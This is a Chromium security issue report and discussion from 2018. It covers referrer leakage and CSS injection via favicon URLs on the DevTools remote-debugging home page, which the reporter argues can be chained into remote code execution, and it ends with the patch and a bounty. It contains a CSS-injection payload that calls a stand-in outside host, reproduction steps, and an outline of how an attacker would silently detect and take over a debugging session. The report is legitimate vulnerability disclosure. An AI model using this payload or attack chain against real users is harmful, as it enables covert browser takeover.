# Security: Referrer leak + CSS injection at home page of remote debugging server = RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [40090538](https://issues.chromium.org/issues/40090538) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ro...@robwu.nl |
| **Assignee** | ro...@robwu.nl |
| **Created** | 2018-02-19 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

When Chrome is started with the --remote-debugging-port=PORT flag, a server starts serving a DevTools front-end at <http://127.0.0.1:PORT/>. The home page (at that URL) has two vulnerabilities because of its favicon handling:

- Referrer leakage.
- CSS injection attack.

If a server does not have /favicon.ico, Chrome will look in the HTML for the favicon declaration. The page can specify something like this:

<link rel="icon" href=");color:red;" type="image/x-icon">
If the server responds with a valid favicon for the request to "/);color:red;", Chrome will save the favicon URL in the database.
When the home page of the remote debugging server is opened, all sites are listed, and if there is a favicon, the favicon is loaded unsafely.

The impact of the referrer leakage is:

- RCE: If the user is not behind a NAT or firewall, an attacker can directly connect to the remote debugging server and control Chrome.
- Otherwise, the user can still be attacked with the same impact by exploiting <https://crbug.com/chromium/813540>.

Combined with CSS injection, an attacker can perform RCE attacks without revealing that the remote debugger is being targeted:

- Use ");background:url(<http://example.com/unique-url-here>" as the favicon "URL".
- If "<http://example.com/unique-url-here>" reaches a server, the attacker knows that the CSS injection has succeeded, and that the following is extremely likely:  
  
  \* The user has opened a page that is under control of the attacker (otherwise the favicon request would not be done).  
  
  \* The user is using remote debugging, at the port in the Referer header.  
  
  Now the attacker can silently try to perform RCE by directly connecting to the IP + port,  
  
  and if that fails, send a payload to the open page (e.g. via WebSockets or EventSource) to exploit <https://crbug.com/chromium/813540>.

**VERSION**  

Chrome Version: 64.0.3282.167 (stable) + 66.0.3351.0 (canary)

**REPRODUCTION CASE**

1. Download the attached Node.js server and start it, e.g.  
   
   node server.js 1337
2. Load the server's page in Chrome with remote debugging:  
   
   chrome --remote-debugging-port=9222 <http://127.0.0.1:1337/>
3. Open the home page of the remote debugging server (e.g. in a different tab or browser):  
   
   <http://127.0.0.1:9222>
4. Look at the page that you opened at step 2, and observe that the page knows (via server.js) the location of the remote debugging server, because at step 3 the referrer got leaked.
5. Take a closer look at the page from step 3, and observe that the title of the attacker's page is red. This is because of CSS injection.

## Attachments

- [server.js](attachments/server.js) (text/plain, 2.6 KB)

## Timeline

### ro...@robwu.nl (2018-02-19)

Patch: https://chromium-review.googlesource.com/c/chromium/src/+/924702

### wf...@chromium.org (2018-02-20)

if --remote-debugging-port is needed and this is a non-standard flag that has to be specifically used, then this has no security impact. Can you describe how an attacker could use this without --remote-debugging-port specified e.g. are there any times this gets turned on behind-the-scenes by Chrome in a non-obvious way?

### dg...@chromium.org (2018-02-20)

Chrome does not turn --remote-debugging-port by itself.

Not sure that leaking the port is a big deal. Most people who run with --remote-debugging-port use well-known port as suggested in many examples on the web.

CSS injection is a thing, but what can one achieve with that?

### ro...@robwu.nl (2018-02-20)

The combination of referer leak + CSS injection allows attackers to reliably detect that remote debugging is enabled, without revealing that an attacker is looking for a vulnerability in the remote debugging server.

This allows attackers to connect to the remote debugging server, or (if blocked by firewall/NAT), exploit vulnerabilities like https://crbug.com/chromium/813540 and https://crbug.com/chromium/813542 when they know that the client is vulnerable.

--remote-debugging-port is enabled by default by Selenium and Puppeteer, and as I have shown in https://crbug.com/chromium/813541, Puppeteer  alone has a large user base.


Without this bug, the attacker needs to perform a port scan (by loading a DevTools-specific URL), which is more obvious and could trigger an investigation.

The port scan normally consists of a request to a devtools-specific URL, but with this vulnerability, attackers can also change the port scan by repeatedly loading <iframe src="http://127.0.0.1:PORT"></iframe>. Those who are unaware of this bug will not discover what the attacker is trying to achieve.

### dg...@chromium.org (2018-03-08)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-03-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/376776f18aa5a445c13c46f5f7e573c1dad65c5a

commit 376776f18aa5a445c13c46f5f7e573c1dad65c5a
Author: Rob Wu <rob@robwu.nl>
Date: Tue Mar 13 10:15:21 2018

Use no-referrer and safe CSS for DevTools discovery page

BUG=813541

Change-Id: Ia73c5201d874ab2a52ecd30476e09d9a1b6d56db
Reviewed-on: https://chromium-review.googlesource.com/924702
Reviewed-by: Dmitry Gozman <dgozman@chromium.org>
Commit-Queue: Rob Wu <rob@robwu.nl>
Cr-Commit-Position: refs/heads/master@{#542756}
[modify] https://crrev.com/376776f18aa5a445c13c46f5f7e573c1dad65c5a/chrome/browser/devtools/frontend/devtools_discovery_page.html


### ro...@robwu.nl (2018-03-28)

The commit above fixes the problem, and it landed in Chrome 67.0.3369.0.

### sh...@chromium.org (2018-03-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-11-12)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-12-03)

Thanks rob@ - $500 for this report, given on the severity assessment from https://crbug.com/chromium/813541#c2.

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### is...@google.com (2018-12-03)

This issue was migrated from crbug.com/chromium/813541?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090538)*
